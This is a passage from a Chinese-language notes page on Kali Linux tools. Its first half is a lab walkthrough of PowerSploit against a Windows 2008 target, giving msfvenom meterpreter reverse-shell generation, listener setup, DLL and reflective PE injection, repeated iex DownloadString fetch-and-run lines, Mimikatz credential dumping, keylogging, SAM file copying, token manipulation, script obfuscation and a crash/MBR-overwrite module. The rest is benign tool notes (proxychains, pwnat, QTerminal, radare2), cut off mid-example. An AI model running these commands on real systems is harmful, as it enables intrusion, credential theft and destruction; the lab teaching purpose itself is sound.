alt="img"></p><p>2.kali利用msfvenom生成一个dll反弹马</p><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.10.128 lport&#x3D;4444 -f dll -o &#x2F;var&#x2F;www&#x2F;msf.dll</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-aed7b61c957c0085.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3.在msf中设置监听(windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp模块进行反弹)并开启监听</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-ff2e48b60ea56bdf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>4.把刚才生成的msf.dll文件拷贝到靶机(windows 2008),然后在windows 2008上运行powershll脚本</p><p>Invoke-DllInjection -ProcessID 464 -Dll C:\Users\Administrator.WIN2008\Desktop\msf.dll</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-098779c723c35101.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>5.kali msf中运行监听,就可以看到windows 2008反弹过来一个session</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-651e038ca9ceb946.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>6.也可以开启一个隐藏进程并注入dll</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-137cd7ee25585b93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Invoke-ReflectivePEInjection 反射型PE注入</p><p>1、先在靶机(windows 2008)上远程加载位于win7 Invoke-ReflectivePEInjection脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/CodeExecution/Invoke-ReflectivePEInjection.ps1">http://10.10.10.187/PowerSploit-master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-a5a601f13a5227cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、kali中利用msfvenom生成一个exe反弹马并对木马进行多次编码</p><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_tcp -e -i 3 lhost&#x3D;10.10.10.128 lport&#x3D;4444 -f exe -o &#x2F;var&#x2F;www&#x2F;msf.exe</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-c2f1168b3b1a722c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3、在kali msf中设置监听(windows&#x2F;x64&#x2F;meterpreter_reverse_tcp)并开启监听</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-3029be91798b14f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>4、把在kali中生成的exe木马复制到靶机，在靶机(windows 2008)执行脚本</p><p>$PEBytes &#x3D; [IO.File]::ReadAllBytes(‘C:\Users\Administrator.WIN2008\Desktop\msf.exe’)</p><p>Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-cb5a593f3ae973ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>5、这时在kali端就能看到一个windows 2008反弹过来的session</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-81499d5f383e7516.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><strong>三、Recon(信息侦察)</strong></p><p>Invoke-Portscan 端口扫描</p><p>1、先在靶机(windows 2008)上远程加载位于win7 Invoke-Portscan.ps1脚本</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-a89ad5196851fbb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、开始端口扫描,这里以扫描一个ip字典为例，别的参数，可以查看帮助文档</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-43b6f3ebcd53198e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Invoke-ReverseDnsLookup 反向DNS查询</p><p>1、 先在靶机(windows 2008)上远程加载位于win7 Invoke-ReverseDnsLookup脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Recon/Invoke-ReverseDnsLookup.ps1">http://10.10.10.187/PowerSploit-master/Recon/Invoke-ReverseDnsLookup.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-4a77d4727f2e9bc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>1、 运行脚本查找特定的ip的主机名,下图可以看到查找ip对应的主机名</p><p>Invoke-ReverseDnsLookup “10.10.10.128,10.10.10.183,10.10.10.187” | fl IP,HostName</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-acebf5de09876a8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Get-HttpStatus 网站目录检测</p><p>1、先在靶机(windows 2008)上远程加载位于win7 Get-HttpStatus脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Recon/Get-HttpStatus.ps1">http://10.10.10.187/PowerSploit-master/Recon/Get-HttpStatus.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-b7825e54f550c2ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、 自己创建一个字典，运行脚本,下图可以看到status状态是ok说明目标存在那个网站目录。</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-0d4f934248dc28a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Get-ComputerDetails 获得主机登录信息</p><p>1、 先在靶机(windows 2008)上远程加载位于win7 Get-ComputerDetails脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Recon/Get-ComputerDetails.ps1">http://10.10.10.187/PowerSploit-master/Recon/Get-ComputerDetails.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-ea3af1dc96f06f7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、 运行脚本Get-ComputerDetails，看到如下效果，有报错，不知道什么原因，难道powerspolit大神异常处理没考虑完全?</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-8bf5f8f429b17329.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><strong>四、Exfiltration(信息收集)</strong> #这个文件夹主要是收集目标主机上的信息</p><p>Invoke-Mimikatz 查看主机密码（需要管理员权限）</p><p>1、先在靶机(windows 2008)上远程加载位于win7 Invoke-Mimikatz脚本,并运行脚本查看密码</p><p>​    iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1">http://10.10.10.187/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-38fd855cf917bd2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Get-Keystrokes 键盘记录(详细的鼠标键盘记录)</p><p>1、先在靶机(windows 2008)上远程加载位于win7 Get-Keystrokes脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1">http://10.10.10.187/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-3022bba786567306.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、运行Get-Keystrokes,并把记录结果保存到一个文件</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-86e9816a298d2211.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Invoke-NinjaCopy 超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）</p><p>1、先在靶机(windows 2008)上远程加载位于win7 Invoke-NinjaCopy脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Exfiltration/Invoke-NinjaCopy.ps1">http://10.10.10.187/PowerSploit-master/Exfiltration/Invoke-NinjaCopy.ps1</a>“)</p><p>get-help Invoke-NinjaCopy</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-458373e569402bab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、运行脚本,把SAM文件复制一份到别处，下图可以看到成功复制一份SAM文件，注意普通复制不能复制系统限制的文件。</p><p>Invoke-NinjaCopy -Path “C:\Windows\System32\config\SAM” -LocalDestination “C:\Users\Administrator\Desktop\SAM”</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-bfe15f446cbbee5b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3、用普通复制测试一下，看看能否复制SAM文件，下图可以看到普通复制无法复制SAM，因为系统对SAM文件进行保护，只要进程一开启(系统开机自动运行关于SAM文件的进程并且无法停止掉进程),别的程序或者进程就无法访问SAM文件。</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-2b853e0193b4ea98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Get-TimedScreenshot 屏幕记录</p><p>1.先在靶机(windows 2008)上远程加载位于win7 Get-TimedScreenshot脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Exfiltration/Get-TimedScreenshot.ps1">http://10.10.10.187/PowerSploit-master/Exfiltration/Get-TimedScreenshot.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-0bf60dd0f5583dec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2.运行脚本,在test文件夹中可以看到抓取屏幕的图片</p><p>Get-TimedScreenshot -Path c:\test\ -Interval 10 -EndTime 23:20</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-262ddf520745009a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3.Get-MicrophoneAudio  通过麦克风记录声音，与Get-TimedScreenshot(屏幕记录)方法一样，这里不再测试</p><p>Invoke-CredentialInjection</p><p>1.先在靶机(windows 2008)上远程加载位于win7 Invoke-TokenManipulation脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/Exfiltration/Invoke-TokenManipulation.ps1">http://10.10.10.187/PowerSploit-master/Exfiltration/Invoke-TokenManipulation.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-226fb40b0e7413aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2.Invoke-TokenManipulation -Enumerate 枚举唯一 可用的令牌 别的例子自己查看帮助</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-ce051374066f6517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><strong>五、ScriptModification 脚本修改</strong></p><p>Out-CompressedDll  将dll压缩并base64编码</p><p>1.先在靶机(windows 2008)上远程加载位于win7 Out-CompressedDll脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/ScriptModification/Out-CompressedDll.ps1">http://10.10.10.187/PowerSploit-master/ScriptModification/Out-CompressedDll.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-268c4d2e8e498149.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2.运行脚本 Out-CompressedDll -FilePath C:\Users\Administrator.WIN2008\Desktop\msf.dll</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-a81b82e0f3265a62.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Out-EncodedCommand  将脚本或代码块编码</p><p>1.先在靶机(windows 2008)上远程加载位于win7 Out-EncodedCommand脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/ScriptModification/">http://10.10.10.187/PowerSploit-master/ScriptModification/</a> Out-EncodedCommand .ps1”)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-918555f4c6ce9cb1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>\2. 脚本块编码</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-8e49854ccb6834fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3.脚本编码</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-74b7d40bf8edd194.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Out-EncryptedScript  脚本加密</p><p>1.先在靶机(windows 2008)上远程加载位于win7 Out-EncryptedScript脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/ScriptModification/">http://10.10.10.187/PowerSploit-master/ScriptModification/</a> Out-EncryptedScript .ps1”)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-1bdbce9672818939.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2.给脚本加密</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-c5cf7eac47945438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>Remove-Comments  删除注释和不必要的空白符</p><p>1.先在靶机(windows 2008)上远程加载位于win7 Remove-Comments脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/ScriptModification/">http://10.10.10.187/PowerSploit-master/ScriptModification/</a> Remove-Comments .ps1”)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-a4471405e6c5e940.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2.运行脚本,删除代码块中的空白和注释以及脚本中的空白和注释</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-f26fb95c7aa0ee82.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><strong>六、Mayhem</strong></p><p>1.首先查看Mayhem帮助说明文档，可以看到说明文档使用Mayhem模块需要先将Mayhem放到C:\Windows\System32\WindowsPowerShell\v1.0\Modules下,然后需要导入模块</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-98737269ce3b686f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2.将Mayhem放到相应的位置之后,便开始导入模块，以及查看命令帮助</p><p>Import-Module Mayhem</p><p>Get-Command -Module Mayhem</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-5e06d8f83e8de359.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3.开始使用命令</p><p>3.1Set-CriticalProcess 退出powershell时使系统蓝屏</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-c2d9906f1f61166f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3.2退出powershell测试是否蓝屏，下图可以看到蓝屏了</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-9bf6da7431537768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/433/format/webp" alt="img"></p><p>3.3 Set-MasterBootRecord 覆写主引导记录，本次实验并没有成功</p><p><strong>PowerUp</strong></p><p>主要来介绍PowerUp模块，powerUp拥有众多用来寻找目标主机的Windows服务漏洞进行提权的实用脚本，先下载脚本：</p><p>IEX(New-Object Net.WebClient).DownloadString(“<a href="http://192.168.0.133/PowerSploit/Privesc/PowerUp.ps1">http://192.168.0.133/PowerSploit/Privesc/PowerUp.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-441382882e5cd412.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1191/format/webp" alt="img"></p><p>1.<strong>Invoke-AllChecks</strong></p><p>该模块会自动执行PowerUp下所有模块来检查目的主机：</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-c21339fdffccf4c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/939/format/webp" alt="img"></p><p>2.<strong>Find-PathDLLHijack</strong></p><p>该模块用于检查当前%PATH%的哪些目录是用户可以写入的：</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-8b020074924693ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>3.<strong>Get-ServiceDetail</strong></p><p>该模块用于返回某服务的信息：</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-186e4ad74b610628.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/778/format/webp" alt="img"></p><h2 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h2><p>代理工具</p><p><a href="https://www.cnblogs.com/qjwhy/p/15317856.html">https://www.cnblogs.com/qjwhy/p/15317856.html</a></p><h2 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a>proxytunnel</h2><h3 id="https-blog-csdn-net-smli-ng-article-details-106177691"><a href="#https-blog-csdn-net-smli-ng-article-details-106177691" class="headerlink" title="https://blog.csdn.net/smli_ng/article/details/106177691"></a><a href="https://blog.csdn.net/smli_ng/article/details/106177691">https://blog.csdn.net/smli_ng/article/details/106177691</a></h3><h2 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h2><h3 id="https-blog-csdn-net-smli-ng-article-details-106162649"><a href="#https-blog-csdn-net-smli-ng-article-details-106162649" class="headerlink" title="https://blog.csdn.net/smli_ng/article/details/106162649"></a><a href="https://blog.csdn.net/smli_ng/article/details/106162649">https://blog.csdn.net/smli_ng/article/details/106162649</a></h3><h2 id="PulseAudio-音量控制"><a href="#PulseAudio-音量控制" class="headerlink" title="PulseAudio 音量控制"></a>PulseAudio 音量控制</h2><h3 id="-7"><a href="#-7" class="headerlink" title=""></a><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132327688.png" alt="image-20220413232702541"></h3><h2 id="pwnat"><a href="#pwnat" class="headerlink" title="pwnat"></a>pwnat</h2><h3 id="描述：-56"><a href="#描述：-56" class="headerlink" title="描述："></a>描述：</h3><p>由于网络环境的限制，大部分计算机都不在公网中，而是位于NAT或者防火墙之后。这时，不同NAT之后的计算机通信就受到限制。为了解决这个问题，Kali Linux提供了一个NAT穿透工具pwnat。该工具首先在公网计算机上建立一个服务端。然后，处于NAT后的其他计算机以客户端模式运行，通过连接服务端，就可以互相访问了。使用该工具，渗透测试人员不需要在NAT路由器上进行设置，就实现了NAT穿透，连接其他NAT后的计算机，形成P2P打洞。</p><p>太老了 没啥用</p><h3 id="参数：-43"><a href="#参数：-43" class="headerlink" title="参数："></a>参数：</h3><p><a href="https://blog.csdn.net/fjh1997/article/details/87969274">https://blog.csdn.net/fjh1997/article/details/87969274</a></p><h1 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h1><h2 id="Qt5-设置"><a href="#Qt5-设置" class="headerlink" title="Qt5 设置"></a>Qt5 设置</h2><h3 id="描述：-57"><a href="#描述：-57" class="headerlink" title="描述："></a>描述：</h3><p>配置 外观 字体 图标主题 界面 样式表啥的</p><h3 id="参数：-44"><a href="#参数：-44" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142108670.png" alt="image-20220414210821521"></p><h2 id="QTerminal"><a href="#QTerminal" class="headerlink" title="QTerminal"></a>QTerminal</h2><h3 id="描述：-58"><a href="#描述：-58" class="headerlink" title="描述："></a>描述：</h3><p>QTerminal是最好的轻量级Linux终端仿真器之一，它有很多很好的特性。您几乎可以更改所有内容，包括颜色、字体、键盘快捷键、键绑定、透明度、书签等等。</p><ul><li>它是一个快速响应的下拉式Linux终端仿真器。</li><li>支持多路复用。</li><li>很多选项可以定制几乎所有的东西。</li><li>可以在一个窗口中显示多个终端模拟器。</li><li>用户可以水平和垂直拆分QTerminal软件窗口。</li></ul><h3 id="参数：-45"><a href="#参数：-45" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142110975.png" alt="image-20220414211009532"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142110833.png" alt="img"></p><h2 id="QTerminal-drop-down"><a href="#QTerminal-drop-down" class="headerlink" title="QTerminal drop down"></a>QTerminal drop down</h2><h3 id="描述：-59"><a href="#描述：-59" class="headerlink" title="描述："></a>描述：</h3><p>下拉式的Qterminal</p><h1 id="R"><a href="#R" class="headerlink" title="R"></a>R</h1><h2 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h2><h3 id="描述：-60"><a href="#描述：-60" class="headerlink" title="描述："></a>描述：</h3><p>radare2是一款开放源代码的逆向工程平台，它可以反汇编、调试、分析和操作二进制文件。</p><p>radare2的主要特点：</p><ul><li>•Multi-architecture multi-platform</li><li>•Highly scriptable</li><li>•Hexadecimal editor</li><li>•IO is wrapped</li><li>•Filesystems support</li><li>•Debugger support</li><li>•Diffing between two functions or binaries</li><li>•Code analysis at opcode, basicblock, function levels</li></ul><h3 id="示例：-2"><a href="#示例：-2" class="headerlink" title="示例："></a>示例：</h3><p>你需要一个样本二进制程序来试用它。你可以使用任何系统二进制文件（<code>ls</code>、<code>bash</code> 等），但为了使本教程的内容简单，请编译以下 C 程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> adder.c<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br>int adder(int num) &#123;<br>        <span class="hljs-built_in">return</span> num + 1;<br>&#125;<br>int <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>        int res, num1 = 100;<br>        res = adder(num1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number now is  : %d\n&quot;</span>, res);<br>        <span class="hljs-built_in">return</span> 0;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc adder.c -o adder<br>$ file adder<br>adder: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=9d4366f7160e1ffb46b14466e8e0d70f10de2240, not stripped<br>$ ./adder<br>Number now is  : 101<br></code></pre></td></tr></table></figure><h4 id="加载二进制文件"><a href="#加载二进制文件" class="headerlink" title="加载二进制文件"></a>加载二进制文件</h4><p>要分析二进制文件，你必须在 Radare2 中加载它。通过提供文件名作为 <code>r2</code> 命令的一个命令行参数来加载它。你会进入一个独立的 Radare2 控制台，这与你的 shell 不同。要退出控制台，你可以输入 <code>Quit</code> 或 <code>Exit</code> 或按 <code>Ctrl+D</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 ./adder<br> -- Learn pancake as <span class="hljs-keyword">if</span> you were radare!<br>[0x004004b0]&gt; quit<br>$<br></code></pre></td></tr></table></figure><h4 id="分析二进制"><a href="#分析二进制" class="headerlink" title="分析二进制"></a>分析二进制</h4><p>在你探索二进制之前，你必须让 <code>r2</code> 为你分析它。你可以通过在 <code>r2</code> 控制台中运行 <code>aaa</code> 命令来实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 ./adder<br> -- Sorry, radare2 has experienced an internal error.<br>[0x004004b0]&gt;<br>[0x004004b0]&gt;<br>[0x004004b0]&gt; aaa<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[x] Analyze <span class="hljs-keyword">function</span> calls (aac)<br>[x] Analyze len bytes of instructions <span class="hljs-keyword">for</span> references (aar)<br>[x] Check <span class="hljs-keyword">for</span> vtables<br>[x] Type matching analysis <span class="hljs-keyword">for</span> all <span class="hljs-built_in">functions</span> (aaft)<br>[x] Propagate noreturn information<br>[x] Use -AA or aaaa to perform additional experimental analysis.<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><p>这意味着每次你选择一个二进制文件进行分析时，你必须在加载二进制文件后输入一个额外的命令 <code>aaa</code>。你可以绕过这一点，在命令后面跟上 <code>-A</code> 来调用 <code>r2</code>；这将告诉 <code>r2</code> 为你自动分析二进制：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 -A ./adder<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[x] Analyze <span class="hljs-keyword">function</span> calls (aac)<br>[x] Analyze len bytes of instructions <span class="hljs-keyword">for</span> references (aar)<br>[x] Check <span class="hljs-keyword">for</span> vtables<br>[x] Type matching analysis <span class="hljs-keyword">for</span> all <span class="hljs-built_in">functions</span> (aaft)<br>[x] Propagate noreturn information<br>[x] Use -AA or aaaa to perform additional experimental analysis.<br> -- Already up-to-date.<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><h4 id="获取一些关于二进制的基本信息"><a href="#获取一些关于二进制的基本信息" class="headerlink" title="获取一些关于二进制的基本信息"></a>获取一些关于二进制的基本信息</h4><p>在开始分析一个二进制文件之前，你需要一些背景信息。在许多情况下，这可以是二进制文件的格式（ELF、PE 等）、二进制的架构（x86、AMD、ARM 等），以及二进制是 32 位还是 64 位。方便的 <code>r2</code> 的 <code>iI</code> 命令可以提供所需的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; iI<br><span class="hljs-built_in">arch</span>     x86<br>baddr    0x400000<br>binsz    14724<br>bintype  elf<br>bits     64<br>canary   <span class="hljs-literal">false</span><br>class    ELF64<br>compiler GCC: (GNU) 8.3.1 20190507 (Red Hat 8.3.1-4)<br>crypto   <span class="hljs-literal">false</span><br>endian   little<br>havecode <span class="hljs-literal">true</span><br>intrp    /lib64/ld-linux-x86-64.so.2<br>laddr    0x0<br>lang     c<br>linenum  <span class="hljs-literal">true</span><br>lsyms    <span class="hljs-literal">true</span><br>machine  AMD x86-64 architecture<br>maxopsz  16<br>minopsz  1<br>nx       <span class="hljs-literal">true</span><br>os       linux<br>pcalign  0<br>pic      <span class="hljs-literal">false</span><br>relocs   <span class="hljs-literal">true</span><br>relro    partial<br>rpath    NONE<br>sanitiz  <span class="hljs-literal">false</span><br>static   <span class="hljs-literal">false</span><br>stripped <span class="hljs-literal">false</span><br>subsys   linux<br>va       <span class="hljs-literal">true</span><br>[0x004004b0]&gt;<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><h3 id="导入和导出"><a href="#导入和导出" class="headerlink" title="导入和导出"></a>导入和导出</h3><p>通常情况下，当你知道你要处理的是什么样的文件后，你就想知道二进制程序使用了什么样的标准库函数，或者了解程序的潜在功能。在本教程中的示例 C 程序中，唯一的库函数是 <code>printf</code>，用来打印信息。你可以通过运行 <code>ii</code> 命令看到这一点，它显示了该二进制所有导入的库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; ii<br>[Imports]<br>nth vaddr      